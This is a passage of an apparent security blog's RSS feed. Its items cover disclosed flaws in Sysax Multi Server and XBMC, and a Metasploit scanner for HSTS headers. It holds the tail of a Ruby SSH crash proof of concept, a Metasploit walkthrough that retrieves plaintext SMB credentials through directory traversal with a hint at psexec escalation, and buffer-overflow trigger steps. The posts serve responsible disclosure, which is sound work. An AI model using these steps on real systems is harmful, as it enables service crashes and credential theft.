  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00].pack(&amp;quot;C*&amp;quot;)

host = ARGV[0]
port = ARGV[1]

sock = TCPSocket.open(host, port)

banner = sock.gets()
puts banner

sock.puts(&amp;quot;SSH-2.0-OpenSSH_5.1p1 Debian-5ubuntu1\r\n&amp;quot;)
sock.puts(packet)
resp = sock.gets()

sock.close()
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;remediation&#34;&gt;Remediation&lt;/h2&gt;

&lt;p&gt;I contacted the developers of Sysax Multi Server on March 18 2013 and April 6 2013. They were able to release a new version (6.11) which is no longer vulnerable to this bug. If you&amp;rsquo;re running Sysax Multi Server with SSH (off by default, but plenty of users on &lt;a href=&#34;http://www.shodanhq.com/search?q=sysax+port%3A22&#34;&gt;ShodanHQ&lt;/a&gt;), I would highly recommend updating to 6.11, available &lt;a href=&#34;http://www.sysax.com/download.htm#sysaxserv&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&#34;update&#34;&gt;Update:&lt;/h2&gt;

&lt;p&gt;It looks like the Metasploit module I wrote for this has been merged! You can view it &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/225342ce8f34b1af49e498c0cc6fa92c127187e8/modules/auxiliary/dos/windows/ssh/sysax_sshd_kexchange.rb&#34;&gt;here&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>XBMC Traversal Metasploit Module</title>
      <link>https://www.mattandreko.com/blog/2013-02-25-xbmc-traversal-metasploit-module/</link>
      <pubDate>Mon, 25 Feb 2013 15:32:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2013-02-25-xbmc-traversal-metasploit-module/</guid>
      <description>

&lt;h2 id=&#34;background&#34;&gt;Background&lt;/h2&gt;

&lt;p&gt;I was talking in &lt;a href=&#34;irc://chat.freenode.net:6667/intern0t&#34;&gt;Intern0t&lt;/a&gt; several months ago. &lt;a href=&#34;https://twitter.com/Acidgen&#34;&gt;AcidGen&lt;/a&gt;, from &lt;a href=&#34;http://www.ioactive.com&#34;&gt;IOActive&lt;/a&gt; mentioned that he found a bug in &lt;a href=&#34;http://www.xbmc.org&#34;&gt;XBMC&lt;/a&gt;. I use &lt;a href=&#34;http://www.xbmc.org&#34;&gt;XBMC&lt;/a&gt; quite a bit at home, on various platforms, since it&amp;rsquo;s extremely wife-friendly. I hit him up, and we started talking. We had a nice Skype conversation, where we discussed possible platforms that were affected, and future exploits that we&amp;rsquo;d like to find. Since I had a jailbroken &lt;a href=&#34;https://www.apple.com/appletv&#34;&gt;Apple TV 2&lt;/a&gt; and &lt;a href=&#34;http://www.raspberrypi.org&#34;&gt;RaspberryPi&lt;/a&gt;, I told him that I could test those platforms and help out.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;An &lt;a href=&#34;http://www.ioactive.com/pdfs/Security_Advisory_XBMC.pdf&#34;&gt;official disclosure&lt;/a&gt; was released, detailing the directory traversal vulnerability. The &lt;a href=&#34;http://www.xbmc.org&#34;&gt;XBMC&lt;/a&gt; team was able to make a &lt;a href=&#34;https://github.com/xbmc/xbmc/commit/bdff099c024521941cb0956fe01d99ab52a65335&#34;&gt;fix&lt;/a&gt;, and the new version 12 is not vulnerable.&lt;/p&gt;

&lt;h2 id=&#34;why-does-this-vulnerability-matter&#34;&gt;Why does this vulnerability matter?&lt;/h2&gt;

&lt;p&gt;When talking with the &lt;a href=&#34;http://www.xbmc.org&#34;&gt;XBMC&lt;/a&gt;, they seemed to play off the vulnerability, because they believed nobody would ever expose this service to a public network. However, a quick &lt;a href=&#34;http://www.shodanhq.com/search?q=xbmc&#34;&gt;ShodanHQ&lt;/a&gt; search shows that people are exposing it. But you may say, &amp;ldquo;Matt, this is only a directory traversal vulnerability, what are you going to do, steal someone&amp;rsquo;s MP3s?&amp;rdquo;. The issue here, lies in that if you can read any file on the system, that may include password files, such as /etc/passwd or even /etc/shadow if the service runs as root. What makes this even worse, is that due to how XBMC has to pass credentials to a fileserver, it stores the credentials in plain text. This gives an attacker a &lt;i&gt;huge&lt;/i&gt; advantage. They now have valid credentials on at least one system. If the system has SMB exposed as well, it could easily be game-over.&lt;/p&gt;

&lt;h2 id=&#34;let-s-see-the-exploit&#34;&gt;Let&amp;rsquo;s see the exploit&amp;hellip;&lt;/h2&gt;

&lt;p&gt;I don&amp;rsquo;t know why it took so long, but I finally finished the MSF module for this vulnerability. It can be found &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/gather/xbmc_traversal.rb&#34;&gt;here&lt;/a&gt;. The usage is pretty simple. Here is a sample exploitation against an &lt;a href=&#34;https://www.apple.com/appletv&#34;&gt;Apple TV 2&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;As usual, watch the pretty ASCII-art go by, and use the module.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;420-1572-man:gather mandreko$ msfconsole
     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v4.6.0-dev [core:4.6 api:1.0]
+ -- --=[ 1048 exploits - 590 auxiliary - 174 post
+ -- --=[ 275 payloads - 28 encoders - 8 nops

msf &amp;gt; use auxiliary/gather/xbmc_traversal
msf  auxiliary(xbmc_traversal) &amp;gt;
&amp;lt;/pre&amp;gt;Check out the options. You&#39;ll see the username and password that need to be set (however it&#39;s often defaulted to &amp;quot;xbmc&amp;quot;, as well as the host, and file to disclose. 
&amp;lt;pre&amp;gt;msf  auxiliary(xbmc_traversal) &amp;gt; show options

Module options (auxiliary/gather/xbmc_traversal):

   Name      Current Setting                                                      Required  Description
   ----      ---------------                                                      --------  -----------
   DEPTH     9                                                                    yes       The max traversal depth
   FILEPATH  /private/var/mobile/Library/Preferences/XBMC/userdata/passwords.xml  no        The name of the file to download
   PASSWORD  xbmc                                                                 yes       The password to use for the HTTP server
   Proxies                                                                        no        Use a proxy chain
   RHOST                                                                          yes       The target address
   RPORT     8080                                                                 yes       The target port
   USERNAME  xbmc                                                                 yes       The username to use for the HTTP server
   VHOST                                                                          no        HTTP server virtual host

msf  auxiliary(xbmc_traversal) &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Go ahead and set the RHOST to the XBMC server.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf  auxiliary(xbmc_traversal) &amp;gt; set rhost 192.168.1.102
rhost =&amp;gt; 192.168.1.102
msf  auxiliary(xbmc_traversal) &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lastly, run the exploit&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf  auxiliary(xbmc_traversal) &amp;gt; run

[+] File saved in: /Users/mandreko/.msf4/loot/20130223100731_default_192.168.1.102_xbmc.http_604967.xml
[*] Auxiliary module execution completed
msf  auxiliary(xbmc_traversal) &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can see this was successful. It saved the file locally, and added notes in &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit&lt;/a&gt;. Just to verify the findings, you can read the file it saved.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf  auxiliary(xbmc_traversal) &amp;gt; cat /Users/mandreko/.msf4/loot/20130223100731_default_192.168.1.102_xbmc.http_604967.xml
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;[*] exec: cat /Users/mandreko/.msf4/loot/20130223100731_default_192.168.1.102_xbmc.http_604967.xml

&amp;lt;passwords&amp;gt;
    &amp;lt;path&amp;gt;
        &amp;lt;from pathversion=&amp;quot;1&amp;quot;&amp;gt;smb://192.168.1.2/Movies&amp;lt;/from&amp;gt;
        &amp;lt;to pathversion=&amp;quot;1&amp;quot;&amp;gt;smb://xbmc:xbmc@192.168.1.2/Movies/&amp;lt;/to&amp;gt;
    &amp;lt;/path&amp;gt;
    &amp;lt;path&amp;gt;
        &amp;lt;from pathversion=&amp;quot;1&amp;quot;&amp;gt;smb://192.168.1.2/tv&amp;lt;/from&amp;gt;
        &amp;lt;to pathversion=&amp;quot;1&amp;quot;&amp;gt;smb://xbmc:xbmc@192.168.1.2/tv/&amp;lt;/to&amp;gt;
    &amp;lt;/path&amp;gt;
    &amp;lt;path&amp;gt;
        &amp;lt;from pathversion=&amp;quot;1&amp;quot;&amp;gt;smb://192.168.1.2/Music&amp;lt;/from&amp;gt;
        &amp;lt;to pathversion=&amp;quot;1&amp;quot;&amp;gt;smb://xbmc:xbmc@192.168.1.2/Music/&amp;lt;/to&amp;gt;
    &amp;lt;/path&amp;gt;
&amp;lt;/passwords&amp;gt;
msf  auxiliary(xbmc_traversal) &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And there you have it. You now have valid credentials on that fileserver. You could start escalating with psexec or other methods. Half the battle is already over.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>HSTS Metasploit Module</title>
      <link>https://www.mattandreko.com/blog/2013-02-21-hsts-metasploit-module/</link>
      <pubDate>Thu, 21 Feb 2013 13:20:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2013-02-21-hsts-metasploit-module/</guid>
      <description>

&lt;p&gt;I have been working as a security consultant for a few months now, and one finding that is on almost every webserver I come across, is the lack of an &lt;a href=&#34;https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security&#34;&gt;HSTS (HTTP Strict Transport Security)&lt;/a&gt; implementation. This is understandable, since HSTS is still fairly new. In fact, before starting at &lt;a href=&#34;http://www.accuvant.com&#34;&gt;Accuvant&lt;/a&gt;, I had never heard of it either! However, since most browsers support it now, I wanted to be able to report on it. As of the time of this post, &lt;a href=&#34;https://www.rapid7.com/products/nexpose&#34;&gt;Nexpose&lt;/a&gt; does not have a finding for this item, but I believe &lt;a href=&#34;http://www.tenable.com/products/nessus&#34;&gt;Nessus&lt;/a&gt; does. To report on this finding, and provide a screenshot evidence to customers, we were often resorting to manually looking at the headers, or implementing home-made scripts to do it.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h2 id=&#34;wait-hsts-what-are-you-talking-about&#34;&gt;Wait, HSTS? What are you talking about?&lt;/h2&gt;

&lt;p&gt;When you visit a website over unsecured HTTP, it&amp;rsquo;s often considered a best practice to do a 302 redirect to the HTTPS site. That way, when browser users just type in the domain, it gets redirected to the secure site. When the &amp;ldquo;Strict-Transport-Security&amp;rdquo; header is added to the HTTPS response, the client then knows for a certain amount of time (based on the header&amp;rsquo;s value) to ONLY request the HTTPS version of the site. This can greatly reduce the chances of phishing.&lt;/p&gt;

&lt;p&gt;One convenient thing that will occur with HSTS, is that even if you make requests to the HTTP version of the site, the browser will actually bypass that, and request straight from the HTTPS site. This prevents leaks that often occur with images, stylesheets, and scripts.&lt;/p&gt;

&lt;h2 id=&#34;get-to-the-module-already&#34;&gt;Get to the module already!&lt;/h2&gt;

&lt;p&gt;The crew over on the &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit&lt;/a&gt; team were really quick adding this module, which isn&amp;rsquo;t surprising since it was super easy to implement. I was honestly surprised that nobody had done it already. The code can be found &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/http/http_hsts.rb&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&#34;so-how-do-i-use-this-thing&#34;&gt;So how do I use this thing?&lt;/h2&gt;

&lt;p&gt;The usage is pretty simple. First, load up Metasploit and gaze at the ASCII-art:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;420-1572-man:~ mandreko$ msfconsole

 ______________________________________________________________________________
|                                                                              |
|                   METASPLOIT CYBER MISSILE COMMAND V4                        |
|______________________________________________________________________________|
      \                                  /                      /
       \     .                          /                      /            x
        \                              /                      /
         \                            /          +           /
          \            +             /                      /
           *                        /                      /
                                   /      .               /
    X                             /                      /            X
                                 /                     ###
                                /                     # % #
                               /                       ###
                      .       /
     .                       /      .            *           .
                            /
                           *
                  +                       *

                                       ^
####      __     __     __          #######         __     __     __        ####
####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####
################################################################################
################################################################################
# WAVE 4 ######## SCORE 31337 ################################## HIGH FFFFFFFF #
################################################################################
                                                           http://metasploit.pro


       =[ metasploit v4.6.0-dev [core:4.6 api:1.0]
+ -- --=[ 1048 exploits - 589 auxiliary - 174 post
+ -- --=[ 275 payloads - 28 encoders - 8 nops

msf &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next, just load up the HSTS Scanner module and look at the options:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf &amp;gt; use auxiliary/scanner/http/http_hsts 
msf  auxiliary(http_hsts) &amp;gt; show options

Module options (auxiliary/scanner/http/http_hsts):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        Use a proxy chain
   RHOSTS                    yes       The target address range or CIDR identifier
   RPORT    443              yes       The target port
   SSL      true             yes       Negotiate SSL for outgoing connections
   THREADS  1                yes       The number of concurrent threads
   VHOST                     no        HTTP server virtual host

msf  auxiliary(http_hsts) &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Add the hosts that you want to scan, by setting the &amp;ldquo;RHOSTS&amp;rdquo; variable:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf  auxiliary(http_hsts) &amp;gt; set rhosts www.paypal.com, www.google.com, www.yahoo.com, www.wikipedia.org
rhosts =&amp;gt; www.paypal.com, www.google.com, www.yahoo.com, www.wikipedia.org
msf  auxiliary(http_hsts) &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Once you&amp;rsquo;re ready, just run the module:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf  auxiliary(http_hsts) &amp;gt; run

[+] 23.65.2.234:443 - Strict-Transport-Security:max-age=14400, max-age=14400
[-] 74.125.131.99:443 No HSTS found.
[*] Scanned 02 of 18 hosts (011% complete)
[-] 74.125.131.104:443 No HSTS found.
[-] 74.125.131.106:443 No HSTS found.
[*] Scanned 04 of 18 hosts (022% complete)
[-] 74.125.131.147:443 No HSTS found.
[-] 74.125.131.105:443 No HSTS found.
[*] Scanned 06 of 18 hosts (033% complete)
[-] 74.125.131.103:443 No HSTS found.
[*] Scanned 08 of 18 hosts (044% complete)
[-] 98.139.183.24:443 No HSTS found.
[*] Scanned 09 of 18 hosts (050% complete)
[*] Scanned 11 of 18 hosts (061% complete)
[*] Scanned 13 of 18 hosts (072% complete)
[*] Scanned 15 of 18 hosts (083% complete)
[-] 208.80.154.225:443 No HSTS found.
[*] Scanned 17 of 18 hosts (094% complete)
[*] Scanned 18 of 18 hosts (100% complete)
[*] Auxiliary module execution completed
msf  auxiliary(http_hsts) &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can see that out of all of those hosts, paypal.com (23.65.2.234) was the only one that implemented the HSTS header.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Sysax 5.64 HTTP Remote Buffer Overflow</title>
      <link>https://www.mattandreko.com/blog/2012-07-28-sysax-564-http-remote-buffer-overflow/</link>
      <pubDate>Sat, 28 Jul 2012 22:56:00 -0400</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2012-07-28-sysax-564-http-remote-buffer-overflow/</guid>
      <description>&lt;p&gt;I have discovered a bug in the &lt;a href=&#34;http://sysax.com/server/index.htm&#34;&gt;Sysax Multi-Server application&lt;/a&gt;. More specifically, it&amp;rsquo;s in the HTTP File Server service, which is not enabled by default. It has to be turned on by the admin for this exploit to properly function. The user in question also needs permission to create a directory.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;In the Sysax service, the configuration would look like this:&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/sysax_5.64_protocols.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;To trigger this vulnerability is pretty simple. Log into the HTTP File Server:&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/sysax_5.64_login.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;After logging in, click the &amp;ldquo;Create Folder&amp;rdquo; link:&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/sysax_5.64_main.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;In the &amp;ldquo;Folder Name&amp;rdquo; textbox, enter 1000 &amp;ldquo;A&amp;rdquo;s:&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/sysax_5.64_create_folder.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The service will then crash, and have the EIP address overwritten:&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/sysax_5.64_crash.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I reported this vulnerability to CodeOrigin, the creators of the Sysax Multi-Server on July 26 17:24 PM EDT. Surprisingly, they got back to me at July 27 04:28 AM PDT with a new version available (5.65).  Unfortunately this version had the same vulnerability, although the EIP offset was different. After reporting this, they got back to me again at July 28 06:59 AM PDT, stating that a new version was available (5.66). This new version appears to have the vulnerability fixed.&lt;/p&gt;

&lt;p&gt;If you&amp;rsquo;re using Sysax Multi-Server, please upgrade, to prevent attackers from infiltrating your systems.&lt;/p&gt;

&lt;p&gt;The exploit can now be found on exploit-db, &lt;a href=&#34;http://www.exploit-db.com/exploits/20676&#34;&gt;here&lt;/a&gt;, where you can also download the vulnerable version of the software.&lt;/p&gt;

&lt;p&gt;Thanks a bunch to &lt;a href=&#34;https://twitter.com/cd1zz&#34;&gt;@cd1zz&lt;/a&gt; and &lt;a href=&#34;https://twitter.com/iMulitia&#34;&gt;@iMulitia&lt;/a&gt; for pointing me to this app!&lt;/p&gt;

&lt;p&gt;UPDATE (2012-08-19): The original exploit had an issue with a variable EIP offset, due to the fact that the root folder for the user was part of the stack.  I was able to discover a second vulnerability to get the server to disclose the path.  This has been incorporated into the new exploit, and works much better.  Sysax has released an updated version that is no longer vulnerable to this.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>